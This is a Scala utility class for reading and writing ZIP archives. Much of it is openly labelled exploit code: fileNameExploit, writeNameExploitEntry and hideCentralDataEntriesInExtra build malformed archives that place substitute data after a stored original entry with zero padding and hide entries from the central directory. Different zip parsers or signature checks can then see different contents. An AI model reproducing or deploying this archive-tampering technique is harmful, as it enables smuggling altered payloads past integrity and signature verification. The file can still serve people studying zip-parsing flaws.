package utils

import java.io._
import org.apache.commons.compress.archivers.zip.{ModdedZipArchiveOutputStream, ZipArchiveInputStream, ZipArchiveEntry}
import scala.util.Try
import scala.collection.mutable.ListBuffer
import org.apache.commons.compress.archivers.ArchiveEntry
import java.util.zip.ZipEntry
import scala.util.Failure
import scala.Some
import scala.util.Success
import scala.util.Failure
import scala.Some
import scala.util.Success

case class FileEntry(zEntry:ZipArchiveEntry, data:Array[Byte], hash:String) {
  def setStored(){
    import utils.CryptoHelper._
    val e = zEntry.asInstanceOf[ZipArchiveEntry]
      e.setMethod(ZipEntry.STORED)
      e.setSize(data.size)
      e.setCrc(crc32(data))
  }
}

class ZipNameHackFileEntry(val entry:ZipArchiveEntry, val hackData:Array[Byte], val originalData:Array[Byte], val hashS:String)
  extends FileEntry(entry,originalData,hashS)

object FileEntry{
  import FileHelper._
  def apply(file:File):FileEntry = {
    val data = readFile(file)
    FileEntry(new ZipArchiveEntry(file.getName),data,SHA1(data).toString)
  }
}

object OptionHelper {
  def optionToTry[T](opt:Option[T], failMessage:String):Try[T] =
    opt match {
      case Some(a) => Success(a)
      case None    => Failure(new Exception(failMessage))
    }
}

object  ZipFile {
  import java.io.{ByteArrayInputStream, ByteArrayOutputStream}

  private val BUFFER_SIZE = 4096

  def apply(fileName:String):Try[ZipFile] =
    ZipFile(new ZipArchiveInputStream(new FileInputStream(new File(fileName))))

  def apply(file:File):Try[ZipFile] =
    ZipFile(new ZipArchiveInputStream(new FileInputStream(file)))

  def apply(file:Option[File]):Try[ZipFile] = OptionHelper.optionToTry(file,"No file given").flatMap(ZipFile(_))

  def apply(bytes: Array[Byte]): Try[ZipFile] = apply(new ZipArchiveInputStream(new ByteArrayInputStream(bytes)))

  def apply(zip: ZipArchiveInputStream): Try[ZipFile] = {
    Try {
      // Back to mutable land for a moment
      var entry:  Option[ArchiveEntry] = Option(zip.getNextEntry)
      val items = new ListBuffer[FileEntry]()
      val buffer: Array[Byte] = new Array[Byte](BUFFER_SIZE)
      while (entry.isDefined) {
        def readIter(acc: ByteArrayOutputStream = new ByteArrayOutputStream()): Array[Byte] = {
          val   read = zip.read(buffer, 0, BUFFER_SIZE)
          if   (read == -1) acc.toByteArray
          else { acc.write(buffer, 0, read); readIter(acc) }
        }
        val fileBytes = readIter()
        items.append(FileEntry(entry.get.asInstanceOf[ZipArchiveEntry],fileBytes,SHA1(fileBytes).asString))
        entry = Option(zip.getNextEntry)
      }
      zip.close()
      if (items.size > 0) new ZipFile(items.toSeq)
      else throw new Exception("Invalid zip file")
    }
  }

  def BLANK = new ZipFile(Seq())
}


class ZipFile(val wrapped: Seq[FileEntry], val hiddenEntries:Seq[FileEntry] = Seq(), val nameExploitEntries:Seq[ZipNameHackFileEntry] = Seq()) extends Seq[FileEntry] {

  lazy val entriesByHash:Map[String,FileEntry] = wrapped.foldLeft(Map[String,FileEntry]()){(acc,f) => acc + (f.hash -> f)}

  def +(e: FileEntry) = new ZipFile(wrapped.+:(e))

  def length = wrapped.length

  def apply(idx:Int) = wrapped(idx)

  def iterator = wrapped.iterator

  def getEntriesByName(name:String):Seq[FileEntry] =
    for {
      entry <- wrapped
      if entry.zEntry.getName == name
    } yield entry

  def -(entryToRemove:String):ZipFile = this -- Set(entryToRemove)

  def --(entriesToRemove:Set[String]):ZipFile = {
    val entries = for{
      FileEntry(entry,data,hash) <- wrapped
      if !entriesToRemove.contains(entry.getName)
    } yield { FileEntry(entry,data,hash)}
    new ZipFile(entries)
  }

  private def setEntriesStored:ZipFile = {
    wrapped.foreach(_.setStored())
    this
  }

  //TODO: There is a bug here: If two files have the same hash, but different names, the second one is ignored
  def normalizedAddition(entryToAdd:FileEntry):ZipFile =
   if(entriesByHash.contains(entryToAdd.hash)) this else
     new ZipFile(this + entryToAdd)

  def addFiles(files:Seq[File]):ZipFile =
    files.foldLeft(this) { (z,f) =>
      z.normalizedAddition(FileEntry(f))
    }

  def hashNormalizedMerge(z:ZipFile):ZipFile =
    z.foldLeft(this){ (orig,fe) =>
      orig.normalizedAddition(fe)
    }

  def fileNameExploit(z:ZipFile):ZipFile =
    this.foldLeft(z){ (zAccum, fe) =>
       val name = fe.zEntry.getName
       val matchedEntries = zAccum.getEntriesByName(name)

       if(matchedEntries.length < 1 ) throw new Exception(s"File $name does not exist in original")
       else if (matchedEntries.length > 1) throw new Exception(s"More than one matched entries of $name in original")

       val matchedEntry = matchedEntries.head

       val znhfe = new ZipNameHackFileEntry(matchedEntry.zEntry, fe.data, matchedEntry.data, matchedEntry.hash)
       new ZipFile(wrapped = zAccum - name, nameExploitEntries = zAccum.nameExploitEntries :+ znhfe)
     }

  //TODO: Handle file de-duplication
  def hideCentralDataEntriesInExtra(z:ZipFile):ZipFile =
    z.foldLeft(this) { (zAccum, fe) =>
      new ZipFile(wrapped = zAccum.wrapped, hiddenEntries = zAccum.hiddenEntries.+:(fe))
    }

  def hideCentralDataEntriesInExtra(files:Seq[File]):ZipFile =
    files.foldLeft(this) { (zAccum, f) =>
      new ZipFile(wrapped = zAccum.wrapped, hiddenEntries = zAccum.hiddenEntries.+:(FileEntry(f)))
    }

  def ++(entriesToAdd:Seq[FileEntry]):ZipFile =
    new ZipFile(entriesToAdd ++ wrapped)

  def getZipFileBytes:Array[Byte] = {
    val outStream = new ByteArrayOutputStream()
    val outFile = new ModdedZipArchiveOutputStream(outStream)

    writeEntries(wrapped,      outFile)

    for { nameExploitEntry <- nameExploitEntries}{
      writeNameExploitEntry(nameExploitEntry,outFile)
    }

    writeEntries(hiddenEntries,outFile)

    import scala.collection.JavaConversions._
    outFile.flush()
    outFile.finish((wrapped ++ nameExploitEntries).map(_.zEntry).toList,hiddenEntries.map(_.zEntry).toList)
    outStream.toByteArray
  }

  private def writeNameExploitEntry(nameHackEntry:ZipNameHackFileEntry, outFile:ModdedZipArchiveOutputStream){
    val origFileLength =  nameHackEntry.originalData.length
    val newFileLength  =  nameHackEntry.hackData.length
    val filename = nameHackEntry.entry.getName
    val originalFileNameSize:Int  = nameHackEntry.entry.getName.length
    val hackedFileLength = originalFileNameSize + origFileLength

    assert(hackedFileLength < (Math.pow(2,16) - 1), s"original filename + original file length must be less than 64K $filename")
    assert(newFileLength < origFileLength, s"New File must be smaller than original for $filename")

    nameHackEntry.entry.setMethod(ZipEntry.STORED)

    outFile.putArchiveEntry(nameHackEntry.entry,nameHackEntry.originalData)
    outFile.write(nameHackEntry.originalData)
    outFile.closeArchiveEntry()

    outFile.writeRaw(nameHackEntry.hackData,0, nameHackEntry.hackData.length)

    val paddingArray:Array[Byte] = Array[Byte](0)

    //write Padding
    for{ i <- 0 to (origFileLength - newFileLength)} {
       outFile.writeRaw(paddingArray,0,1)
    }

  }

  private def writeEntries(entries:Seq[FileEntry], outFile:ModdedZipArchiveOutputStream) {
    for{
      FileEntry(entry,data,hash) <- entries
    }{
      outFile.putArchiveEntry(entry)
      outFile.write(data)
      outFile.closeArchiveEntry()
    }
  }

}